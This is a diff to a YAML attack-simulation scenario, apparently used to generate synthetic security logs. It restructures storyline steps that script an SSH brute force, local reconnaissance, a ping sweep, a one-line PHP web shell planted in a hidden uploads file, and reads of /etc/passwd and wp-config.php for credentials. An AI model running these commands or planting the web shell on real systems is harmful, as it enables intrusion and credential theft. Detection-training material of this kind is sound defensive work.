@@ -142,7 +142,7 @@ environment:
         monitoring_segments: [office_lan, server_dmz]
         direction: bidirectional
         placement: span
-        log_formats: [zeek_conn, zeek_dns]
+        log_formats: [zeek]
         description: "Core switch SPAN port monitoring all internal traffic"
       - type: ids
         name: perimeter-ids
@@ -194,9 +194,8 @@ baseline_activity:
 
 output:
   logs:
-    - format: windows_event_security
-    - format: zeek_conn
-    - format: zeek_dns
+    - format: windows
+    - format: zeek
     - format: ecar
     - format: syslog
     - format: bash_history
@@ -211,120 +210,144 @@ storyline:
     actor: webadmin
     system: WEB-SRV-01
     activity: "SSH brute force attack against web server from external IP"
-    details:
-      technique: "T1110.001 - Brute Force: Password Guessing"
-      description: "Attacker launches SSH brute force against public-facing web server"
-      source_ip: "45.33.32.156"
-      dst_port: 22
+    events:
+      - type: failed_logon
+        technique: "T1110.001 - Brute Force: Password Guessing"
+        description: "Attacker launches SSH brute force against public-facing web server"
+        source_ip: "45.33.32.156"
 
   # Phase 2: Initial access - successful SSH login
   - time: "2024-03-12T14:22:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Successful SSH login after brute force with compromised credentials"
-    details:
-      technique: "T1078.003 - Valid Accounts: Local Accounts"
-      description: "Attacker gains access using guessed credentials for www-data service account"
-      source_ip: "45.33.32.156"
-      dst_port: 22
+    events:
+      - type: ssh_session
+        technique: "T1078.003 - Valid Accounts: Local Accounts"
+        description: "Attacker gains access using guessed credentials for www-data service account"
+        source_ip: "45.33.32.156"
 
   # Phase 3: Local reconnaissance
   - time: "2024-03-12T14:23:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'whoami' to identify current user context"
-    details:
-      technique: "T1033 - System Owner/User Discovery"
-      command: "whoami"
+    events:
+      - type: process
+        technique: "T1033 - System Owner/User Discovery"
+        process_name: "whoami"
+        command_line: "whoami"
 
   - time: "2024-03-12T14:23:30Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'id' to enumerate groups and privileges"
-    details:
-      technique: "T1033 - System Owner/User Discovery"
-      command: "id"
+    events:
+      - type: process
+        technique: "T1033 - System Owner/User Discovery"
+        process_name: "id"
+        command_line: "id"
 
   - time: "2024-03-12T14:24:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'uname -a' to fingerprint operating system"
-    details:
-      technique: "T1082 - System Information Discovery"
-      command: "uname -a"
+    events:
+      - type: process
+        technique: "T1082 - System Information Discovery"
+        process_name: "uname"
+        command_line: "uname -a"
 
   - time: "2024-03-12T14:25:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'cat /etc/passwd' to enumerate local accounts"
-    details:
-      technique: "T1087.001 - Account Discovery: Local Account"
-      command: "cat /etc/passwd"
+    events:
+      - type: process
+        technique: "T1087.001 - Account Discovery: Local Account"
+        process_name: "cat"
+        command_line: "cat /etc/passwd"
 
   - time: "2024-03-12T14:26:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'netstat -tulpn' to discover listening services"
-    details:
-      technique: "T1049 - System Network Connections Discovery"
-      command: "netstat -tulpn"
+    events:
+      - type: process
+        technique: "T1049 - System Network Connections Discovery"
+        process_name: "netstat"
+        command_line: "netstat -tulpn"
 
   - time: "2024-03-12T14:27:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'ip addr' to identify network interfaces"
-    details:
-      technique: "T1016 - System Network Configuration Discovery"
-      command: "ip addr"
+    events:
+      - type: process
+        technique: "T1016 - System Network Configuration Discovery"
+        process_name: "ip"
+        command_line: "ip addr"
 
   # Phase 4: Network discovery
   - time: "2024-03-12T14:29:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'arp -a' to view ARP cache for local network hosts"
-    details:
-      technique: "T1018 - Remote System Discovery"
-      command: "arp -a"
+    events:
+      - type: process
+        technique: "T1018 - Remote System Discovery"
+        process_name: "arp"
+        command_line: "arp -a"
 
   - time: "2024-03-12T14:30:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Ping sweep of 192.168.20.0/24 subnet to discover active hosts"
-    details:
-      technique: "T1018 - Remote System Discovery"
-      command: "for i in $(seq 1 254); do ping -c 1 -W 1 192.168.20.$i; done"
+    events:
+      - type: process
+        technique: "T1018 - Remote System Discovery"
+        process_name: "ping"
+        command_line: "for i in $(seq 1 254); do ping -c 1 -W 1 192.168.20.$i; done"
 
   # Phase 5: Web shell deployment
   - time: "2024-03-12T14:35:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Deploy PHP web shell to Apache document root for persistent access"
-    details:
-      technique: "T1505.003 - Server Software Component: Web Shell"
-      command: "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/uploads/.info.php"
-      description: "Simple PHP web shell hidden in uploads directory"
+    events:
+      - type: process
+        technique: "T1505.003 - Server Software Component: Web Shell"
+        process_name: "echo"
+        command_line: "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/uploads/.info.php"
+        description: "Simple PHP web shell hidden in uploads directory"
 
   - time: "2024-03-12T14:36:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Test web shell functionality via curl"
-    details:
-      technique: "T1505.003 - Server Software Component: Web Shell"
-      command: "curl http://localhost/uploads/.info.php?cmd=id"
+    events:
+      - type: process
+        technique: "T1505.003 - Server Software Component: Web Shell"
+        process_name: "curl"
+        command_line: "curl http://localhost/uploads/.info.php?cmd=id"
 
   # Phase 6: Credential harvesting from web server configs
   - time: "2024-03-12T14:38:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Search Apache and PHP configuration for database credentials"
-    details:
-      technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
-      command: "grep -r password /var/www/html/ /etc/apache2/ 2>/dev/null"
+    events:
+      - type: process
+        technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
+        process_name: "grep"
+        command_line: "grep -r password /var/www/html/ /etc/apache2/ 2>/dev/null"
 
   - time: "2024-03-12T14:40:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Read wp-config.php to extract database credentials"
-    details:
-      technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
-      command: "cat /var/www/html/wp-config.php"
+    events:
+      - type: process
+        technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
+        process_name: "cat"
+        command_line: "cat /var/www/html/wp-config.php"
